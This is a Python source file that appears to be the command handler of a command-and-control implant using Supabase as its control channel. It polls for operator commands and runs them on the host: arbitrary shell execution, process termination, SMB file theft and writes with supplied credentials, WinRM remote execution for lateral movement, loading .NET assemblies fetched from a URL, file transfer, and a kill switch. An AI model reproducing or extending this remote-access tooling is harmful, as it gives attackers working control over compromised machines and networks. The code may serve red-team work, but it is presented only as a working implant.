import os
import logging
from supabase import create_client
from .commands import update_command_status, fetch_pending_commands_for_hostname
from .file_operations import handle_download_command, handle_upload_command, fetch_pending_uploads, download_from_supabase
from .system_info import get_system_info
from .config import supabase, SUPABASE_KEY

# Conditional import based on the operating system
if os.name == 'nt':  # 'nt' indicates Windows
    from utils.winapi import ls, list_users_in_group
    from utils.winapi.smb_get import smb_get  # Ensure correct import
    from utils.winapi.smb_write import smb_write  # Ensure correct import
    from utils.winapi.winrm_execute import winrm_execute  # Import the winrm_execute function
    from utils.winapi.pwd import wpwd  # Import the wpwd function
    from utils.winapi.wami import wami  # Import the wami function
    from utils.winapi.ps import list_processes, grep_processes, terminate_process  # Import ps functions
    from utils.winapi.run import run_process  # Import the run function
    from utils.winapi.netexec import load_dotnet_assembly  # Import the netexec function

def handle_kill_command(command_id, command_text, hostname):
    """Handles the kill command, updates the command status to 'Completed', marks the agent as 'Dead', and exits."""
    if command_text.strip().lower() == "kill":
        logging.info("Kill command received. Updating status and preparing to exit agent.")

        # Update the command status to 'Completed' and note that the agent is being terminated
        try:
            response = supabase.table('py2').update({
                'status': 'Completed',
                'output': 'Agent terminated'
            }).eq('id', command_id).execute()

            if response.data:
                logging.info("Command status updated successfully to 'Completed'.")
            else:
                logging.warning(f"Error updating command status: {response.json()}")  # Log error details

        except Exception as e:
            logging.error(f"Failed to update command status before termination: {e}")

        # Update the 'settings' table to mark the agent as 'Dead'
        try:
            response = supabase.table('settings').update({
                'check_in': 'Dead'
            }).eq('hostname', hostname).execute()

            if response.data:
                logging.info("Agent status updated successfully to 'Dead'.")
            else:
                logging.warning(f"Error updating agent status: {response.json()}")  # Log error details

        except Exception as e:
            logging.error(f"Failed to update agent status before termination: {e}")

        finally:
            logging.info("Shutdown sequence initiated.")
            os._exit(0)  # Force the agent to terminate

def execute_commands():
    """Executes pending commands and handles file uploads/downloads."""

    hostname, ip, os_info = get_system_info()

    # Handle pending uploads
    pending_uploads_response = fetch_pending_uploads()
    if pending_uploads_response.data:
        for upload in pending_uploads_response.data:
            file_url = upload.get('file_url')
            remote_path = upload.get('remote_path')
            if file_url and remote_path:
                if download_from_supabase(file_url, remote_path):
                    supabase.table("uploads").update({"status": "completed"}).eq("id", upload['id']).execute()
                else:
                    supabase.table("uploads").update({"status": "failed"}).eq("id", upload['id']).execute()

    # Fetch and handle commands for the hostname
    pending_commands_response = fetch_pending_commands_for_hostname(hostname)
    if pending_commands_response.data:
        for command in pending_commands_response.data:
            command_id = command['id']
            command_text = command.get('command', '')  # Ensure command_text is always defined
            username = command.get('username', 'Unknown')

            # Handle kill command (this will exit the script if applicable)
            if command_text.lower().startswith('kill'):
                handle_kill_command(command_id, command_text, hostname)

            # Handle 'ls' command only if on Windows
            elif os.name == 'nt' and command_text.lower().startswith('ls'):
                try:
                    path = command_text.split(' ', 1)[1]  # Expecting command to be in format "ls [path]"
                    result = ls(path)
                    status = 'Completed'
                    output = "\n".join(result)
                except Exception as e:
                    status = 'Failed'
                    output = str(e)
                update_command_status(command_id, status, output, hostname, ip, os_info, username)

            # Handle 'ps' command only if on Windows
            elif os.name == 'nt' and command_text.lower() == 'ps':
                try:
                    result = list_processes()
                    status = 'Completed'
                    output = "\n".join(result)
                except Exception as e:
                    status = 'Failed'
                    output = str(e)
                update_command_status(command_id, status, output, hostname, ip, os_info, username)

            # Handle 'ps grep' command only if on Windows
            elif os.name == 'nt' and command_text.lower().startswith('ps grep'):
                try:
                    pattern = command_text.split(' ', 2)[2]  # Expecting command to be in format "ps grep [pattern]"
                    result = grep_processes(pattern)
                    status = 'Completed'
                    output = "\n".join(result)
                except Exception as e:
                    status = 'Failed'
                    output = str(e)
                update_command_status(command_id, status, output, hostname, ip, os_info, username)

            # Handle 'ps term' command only if on Windows
            elif os.name == 'nt' and command_text.lower().startswith('ps term'):
                try:
                    process_id = int(command_text.split(' ', 2)[2])  # Expecting command to be in format "ps term [processid]"
                    result = terminate_process(process_id)
                    status = 'Completed'
                    output = result
                except Exception as e:
                    status = 'Failed'
                    output = str(e)
                update_command_status(command_id, status, output, hostname, ip, os_info, username)

            # Handle 'run' command only if on Windows
            elif os.name == 'nt' and command_text.lower().startswith('run'):
                try:
                    executable_path = command_text.split(' ', 1)[1]  # Expecting command to be in format "run [path_to_remote_file]"
                    result = run_process(executable_path)
                    status = 'Completed'
                    output = result
                except Exception as e:
                    status = 'Failed'
                    output = str(e)
                update_command_status(command_id, status, output, hostname, ip, os_info, username)

            # Handle 'whoami' command with OS check
            elif command_text.lower() == 'whoami':
                if os.name == 'nt':
                    try:
                        result = wami()
                        status = 'Completed'
                        output = "\n".join(result)
                    except Exception as e:
                        status = 'Failed'
                        output = str(e)
                else:
                    try:
                        result = os.popen('whoami').read()
                        status = 'Completed'
                        output = result
                    except Exception as e:
                        status = 'Failed'
                        output = str(e)
                update_command_status(command_id, status, output, hostname, ip, os_info, username)

            # Handle 'users <group_name>' command only if on Windows
            elif os.name == 'nt' and command_text.lower().startswith('users '):
                try:
                    group_name = command_text.split(' ', 1)[1]  # Expecting command to be in format "users [group_name]"
                    result = list_users_in_group(group_name)
                    status = 'Completed'
                    output = "\n".join(result)
                except Exception as e:
                    status = 'Failed'
                    output = str(e)
                update_command_status(command_id, status, output, hostname, ip, os_info, username)

            # Handle 'smb write <local_file_path> <remote_smb_path> [username password domain]' command only if on Windows
            elif os.name == 'nt' and command_text.lower().startswith('smb write '):
                parts = command_text.split(' ')
                if len(parts) < 3:
                    status = 'Failed'
                    output = "Invalid smb write command format. Use 'smb write <local_file_path> <remote_smb_path> [username password domain]'."
                else:
                    try:
                        local_file_path = parts[2]
                        remote_smb_path = parts[3]
                        if len(parts) == 7:
                            username, password, domain = parts[4], parts[5], parts[6]
                            result = smb_write(local_file_path, remote_smb_path, username, password, domain)
                        else:
                            result = smb_write(local_file_path, remote_smb_path)
                        status = 'Completed'
                        output = result
                    except Exception as e:
                        status = 'Failed'
                        output = str(e)
                update_command_status(command_id, status, output, hostname, ip, os_info, username)

            # Handle 'smb get <remote_file_path> <local_file_path> [username password domain]' command only if on Windows
            elif os.name == 'nt' and command_text.lower().startswith('smb get '):
                parts = command_text.split(' ')
                if len(parts) < 3:
                    status = 'Failed'
                    output = "Invalid smb get command format. Use 'smb get <remote_file_path> <local_file_path> [username password domain]'."
                else:
                    try:
                        remote_file_path = parts[2]
                        local_file_path = parts[3]
                        if len(parts) == 7:
                            username, password, domain = parts[4], parts[5], parts[6]
                            result = smb_get(remote_file_path, local_file_path, username, password, domain)
                        else:
                            result = smb_get(remote_file_path, local_file_path)
                        status = 'Completed'
                        output = result
                    except Exception as e:
                        status = 'Failed'
                        output = str(e)
                update_command_status(command_id, status, output, hostname, ip, os_info, username)

            # Handle 'winrmexec <remote_host> <command> [username password domain]' command only if on Windows
            elif os.name == 'nt' and command_text.lower().startswith('winrmexec '):
                parts = command_text.split(' ')
                if len(parts) < 3:
                    status = 'Failed'
                    output = "Invalid winrmexec command format. Use 'winrmexec <remote_host> <command> [username password domain]'."
                else:
                    try:
                        remote_host = parts[1]
                        command = parts[2]
                        if len(parts) == 6:
                            username, password, domain = parts[3], parts[4], parts[5]
                            result = winrm_execute(remote_host, command, username, password, domain)
                        else:
                            result = winrm_execute(remote_host, command)
                        status = 'Completed'
                        output = result
                    except Exception as e:
                        status = 'Failed'
                        output = str(e)
                update_command_status(command_id, status, output, hostname, ip, os_info, username)

            # Handle 'pwd' command with OS check
            elif command_text.lower() == 'pwd':
                if os.name == 'nt':
                    try:
                        result = wpwd()
                        status = 'Completed'
                        output = result
                    except Exception as e:
                        status = 'Failed'
                        output = str(e)
                else:
                    try:
                        result = os.popen('pwd').read()
                        status = 'Completed'
                        output = result
                    except Exception as e:
                        status = 'Failed'
                        output = str(e)
                update_command_status(command_id, status, output, hostname, ip, os_info, username)

            # Handle download command
            elif command_text.lower().startswith('download'):
                status, output = handle_download_command(command_text, username)

            # Handle upload command
            elif command_text.lower().startswith('upload'):
                status, output = handle_upload_command(command_text, username)

            # Handle netexec command
            elif command_text.lower().startswith("netexec "):
                try:
                    _, file_url, *arguments = command_text.split(maxsplit=2)
                    arguments = " ".join(arguments)
                    output, error = load_dotnet_assembly(file_url, arguments)
                    status = "Completed" if not error else "Failed"
                    output = output if not error else f"{output}\n{error}"
                except Exception as e:
                    status = "Failed"
                    output = str(e)
                update_command_status(command_id, status, output, hostname, ip, os_info, username)

            # Handle generic shell commands
            else:
                try:
                    result = os.popen(command_text).read()
                    status = 'Completed'
                    output = result
                except Exception as e:
                    status = 'Failed'
                    output = str(e)
                update_command_status(command_id, status, output, hostname, ip, os_info, username)
